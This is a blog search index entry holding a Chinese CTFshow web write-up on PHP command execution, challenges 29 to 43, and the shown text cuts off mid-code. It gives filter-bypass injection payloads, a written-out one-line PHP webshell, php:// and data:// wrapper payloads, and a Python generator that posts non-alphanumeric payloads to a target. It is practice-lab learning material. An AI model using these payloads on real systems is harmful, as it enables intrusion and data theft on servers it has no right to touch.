<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTFshow web入门</title>
    <link href="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/"/>
    <url>/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-web入门"><a href="#CTFshow-web入门" class="headerlink" title="CTFshow web入门"></a>CTFshow web入门</h1><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h4><p>只要提交的参数值不出现 flag 就行</p><p>先看当前目录的文件，可以看到 flag 就在当前目录下，叫 flag.php</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>构造 payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);   <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla?.php&#x27;</span>);使用 ? 进行匹配<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla\g.php&#x27;</span>);  转义绕过<br><br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls -ld&#x27;</span>);看当前目录的权限<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;echo \&#x27;&lt;?php @eval($_REQUEST[&quot;cmd&quot;]); ?&gt;\&#x27; &gt; eval.php&#x27;</span>);看一下 <span class="hljs-keyword">eval</span>.php内容 <br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat eval.php&#x27;</span>); <br>/<span class="hljs-keyword">eval</span>.php?cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);调用 这里直接调用我们自己写的木马就不用担心过滤的问题了 或者直接连接一剑<br><br><br><br>?c=echo <span class="hljs-string">`nl fl&#x27;&#x27;ag.php`</span>;在 Shell 脚本或命令行中，反引号<span class="hljs-string">` `</span> 和 $() 用于执行命令并获取其输出。nl: 这个命令会给输入的文本添加行号。它常用于格式化文本，以便于阅读和调试<br></code></pre></td></tr></table></figure><h4 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h4><p>echo大法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><br>/?c=passthru(<span class="hljs-string">&quot;cat f*&quot;</span>);<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.p<span class="hljs-string">&#x27;&#x27;</span>hp`;<br>/?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> f*lag.p*hp`;<br>?c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> f*`;<br></code></pre></td></tr></table></figure><h4 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 被过滤的解决方案：<br>more：一页一页的显示档案内容<br>less：与 more 类似<br><span class="hljs-built_in">head</span>：查看头几行<br><span class="hljs-built_in">tac</span>：从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>：查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>：以二进制的方式读取档案内容<br>vi：一种编辑器，这个也可以查看<br>vim：一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>：可以查看<br><span class="hljs-built_in">uniq</span>：可以查看<br>file -f：报错出具体内容<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">经典逃逸 ?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);类似弄了个一句话木马 ，并且参数 <span class="hljs-number">1</span> 后面的内容不受正则匹配的影响。<br><br>    <span class="hljs-keyword">echo</span>大法       ?c=<span class="hljs-keyword">echo</span>`nl%<span class="hljs-number">09</span>fla*`;<br>              ?c=<span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`tac%<span class="hljs-number">09</span>f*`;<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>scandir(pos(localeconv())): 这个函数调用 scandir() 用于扫描目录，pos(localeconv()) 返回当前本地化设置的符号。这段代码的目的是扫描某个目录下的文件和目录。</p><p>array_reverse(): 这个函数用于将数组中的元素倒序排列。在这里它被应用在 scandir() 的返回值上，意味着文件和目录列表将会以相反的顺序返回。</p><p>next(): 这个函数用于将数组的内部指针向前移动并返回当前元素的值。在这里它似乎是用于获取数组的下一个元素。</p><p>show_source(): 这个函数用于输出文件的源代码。这个代码的意图似乎是扫描某个目录下的文件和目录，然后将它们倒序排列，并尝试显示它们中的下一个文件的源代码。</p><h4 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h4><p>源码过滤了分号，echo，反引号，单引号，括号，分号。但没有过滤双引号。</p><p>方法1</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br> <span class="hljs-string">?&gt;</span> 是 <span class="hljs-variable constant_">PHP</span> 代码的结束标记，指示 <span class="hljs-variable constant_">PHP</span> 代码的结束，从这里开始的内容将被视为普通的 <span class="hljs-variable constant_">HTML</span> 或文本。<br>这里，也可以用<span class="hljs-variable">$_POST</span>，那么后续传参就通过post传参。<br> <span class="hljs-string">?c</span>=<span class="hljs-variable">$nice</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-string">?&gt;</span>&amp;url=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-<br>encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-33-34-35-36"><a href="#web-33-34-35-36" class="headerlink" title="web 33 34 35 36"></a>web 33 34 35 36</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">url + <span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br><br></code></pre></td></tr></table></figure><h4 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123; <span class="hljs-comment">//过滤但有include</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>与之前基于<span class="hljs-keyword">eval</span>的命令执行不同，这里是<span class="hljs-keyword">include</span>，要传入一个文件名<br></code></pre></td></tr></table></figure><p>data协议</p><p>data协议是一种允许你在URL中嵌入数据的协议</p><p>&#x2F;?c&#x3D;data:text&#x2F;plain,<?php system("ls");?> </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">先对 </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 进行 base64 编码</span><br><span class="language-xml">再利用伪协议传输，c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-38"><a href="#web-38" class="headerlink" title="web 38"></a>web 38</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br>不能是flag，php，file这些字符串并且不分大小写<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">pay1</span><br><span class="language-xml">php 代码这里可以使用 php 短标签进行绕过，flag.php 可继续用通配符 ? 绕过</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fla?.???&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">pay2</span><br><span class="language-xml">c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h4><p> 会在后面拼接一个 .php，但是过滤了 flag<img src="https://img2023.cnblogs.com/blog/2971427/202308/2971427-20230831224641955-1449471307.png" alt="img"></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">闭合 include 函数，让拼接不执行。</span><br><span class="language-xml"> ?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fl*&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml">)?&gt;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"> </span><br><span class="language-php"> 其实不用做其他处理，直接用通配符代替传参即可。</span><br><span class="language-php"> ?c=data:<span class="hljs-comment">//text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_69289738/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">132689462</span><br></code></pre></td></tr></table></figure><p>get_defined_vars()返回的是一个多维数组，我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p><p><img src="C:\Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241022201030591.png" alt="image-20241022201030591"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 函数用于打印变量，以更容易理解的形式展示<br><br><br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span>：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)<br><br><br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span>：返回数组中的当前元素的值。<br>这里也可以换成<span class="hljs-built_in">current</span>()，作用和pos类似<br><br><br><span class="hljs-function"><span class="hljs-title">array_reverse</span><span class="hljs-params">()</span></span>：数组逆序<br><br><br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>：获取目录下的文件<br><br><br><span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>： 函数将内部指针指向数组中的下一个元素，并输出。<br><br><br>通过 <span class="hljs-built_in">pos</span>(<span class="hljs-built_in">localeconv</span>())得到点号<br>因为<span class="hljs-built_in">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>)表示得到当前目录下的文件<br>PS：如果我没有记错，<span class="hljs-built_in">scnadir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)也能扫描当前目录下面的文件，但是这道题貌似无法使用<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>)和<span class="hljs-built_in">chr</span>(<span class="hljs-number">48</span>)（.和/的ASCII码）进行过<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure><ol><li><code>localeconv()</code> 返回一个包含当前区域设置的数组。</li><li><code>current()</code> 获取该数组的第一个元素。</li><li><code>scandir()</code> 列出该元素指定的目录中的所有文件和子目录。</li><li><code>array_reverse()</code> 反转 <code>scandir()</code> 的结果。</li><li><code>next()</code> 移动内部指针并获取下一个文件或目录。</li><li><code>show_source()</code> 显示获取到的文件或目录的源代码。</li></ol><h4 id="web-41"><a href="#web-41" class="headerlink" title="web 41"></a>web 41</h4><p>无数字无字母，直接套用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_true</span>(<span class="hljs-params">reg, asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> reg.<span class="hljs-keyword">match</span>(<span class="hljs-built_in">chr</span>(asc)) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_url_code</span>(<span class="hljs-params">asc: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;asc:02x&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">char_or_dict</span>(<span class="hljs-params">reg</span>) -&gt; <span class="hljs-built_in">dict</span>:<br>    dic = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">if</span> is_true(reg, i) <span class="hljs-keyword">and</span> is_true(reg, j):<br>                char = <span class="hljs-built_in">chr</span>(i | j)<br>                <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> dic <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(char) &gt; <span class="hljs-number">126</span>:<br>                    <span class="hljs-keyword">continue</span><br>                dic[char] = [to_url_code(i), to_url_code(j)]<br>    <span class="hljs-keyword">return</span> dic<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_char_or</span>(<span class="hljs-params">char: <span class="hljs-built_in">str</span>, dic: <span class="hljs-built_in">dict</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    s1 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    s2 = <span class="hljs-string">&#x27;&#x27;</span>.join(dic[i][<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;(&quot;<span class="hljs-subst">&#123;s1&#125;</span>&quot;|&quot;<span class="hljs-subst">&#123;s2&#125;</span>&quot;)&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Url: &quot;</span>)<br>    reg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&quot;</span>, re.I)<br>    char_ordic = char_or_dict(reg)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        param = get_char_or(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your function: &quot;</span>), char_ordic) + get_char_or(<br>            <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;your command: &quot;</span>), char_ordic<br>        )<br>        <span class="hljs-built_in">print</span>(param)<br>        <span class="hljs-built_in">print</span>(urllib.parse.unquote(param))<br>        data = &#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)&#125;<br>        r = requests.post(url, data=data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] result:\n<span class="hljs-subst">&#123;r.text&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h4 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>分析：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>将 get 请求传递的 c 的内容与后面内容进行拼接后作为 system 函数的参数；</p><blockquote><p>&#x2F;dev&#x2F;null 是一个重定向操作符，用于将标准输出（stdout）重定向到 &#x2F;dev&#x2F;null，这意味着命令的标准输出将不会显示在终端或网页上，也不会写入任何文件；</p></blockquote><p>2&gt;&amp;1 是另一个重定向操作符，它将标准错误（stderr）重定向到标准输出（stdout），&gt;&amp;1 表示将标准错误重定向到标准输出所指向的地方（即 &#x2F;dev&#x2F;null），这意味着命令的所有错误信息也会被丢弃。<br>方法：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">（<span class="hljs-number">1</span>）使用分号 <span class="hljs-comment">;     ?c=ls; 命令分隔，分号只适用于 Linux 系统，不适用于 Windows 系统。</span><br>（<span class="hljs-number">2</span>）使用逻辑或 ||  ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls|| 对于两个或，前面为真，只执行前面的，后面命令不会执行；而对于一个或， 无论第一个命令执行为真还是假，都是直接执行第二个命令。<br>（<span class="hljs-number">3</span>）使用 &amp;&amp; 或者 &amp;  <br>对于两个与，当第一个命令执行失败（为假），那么第二个命令也不会被执行；对于一个与，前面的语句为假则直接执行后面的，前面可真可假，后面命令都会执行； 需要改成url编码 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><br><span class="hljs-number">4</span>、<span class="hljs-variable">%0</span>a 换行符截断 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><h4 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; 